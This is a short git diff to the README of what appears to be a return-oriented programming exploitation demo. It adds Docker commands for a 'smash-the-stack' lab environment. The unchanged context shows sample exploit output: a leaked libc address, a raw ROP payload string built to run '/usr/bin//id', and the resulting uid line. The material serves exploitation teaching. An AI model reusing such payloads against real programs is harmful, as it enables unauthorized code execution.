@@ -18,6 +18,12 @@ Usage:
      [+] libc .data address: 0xf76cd040
      [<] AAAAAAAAAAAAAAAAAAAAAAAADCBA�7a�����/usr@�l�_;U��7a�����/binD�l�_;U��7a�����//idH�l�_;U��7a���������L�l�	^i�_;U�,�R�,�R�,�R�,�R�,�R�,�R�,�R�,�R�_;U��7a�����@�l�P�l�_;U��7a�T�l�P�l�����LOU�,�R�,�R�,�R�,�R�,�R�,�R�,�R�,�R�,�R�,�R�,�R���S�@�l��EU�
      [>] uid=1000(packz) gid=1000(packz)
+
+It's also possible to create an environment with
+
+    $ sudo docker build --tag=smash-the-stack .
+    $ sudo docker run -i -t smash-the-stack /bin/bash
+
 # Link
 
  - http://www.shell-storm.org/blog/Return-Oriented-Programming-and-ROPgadget-tool/
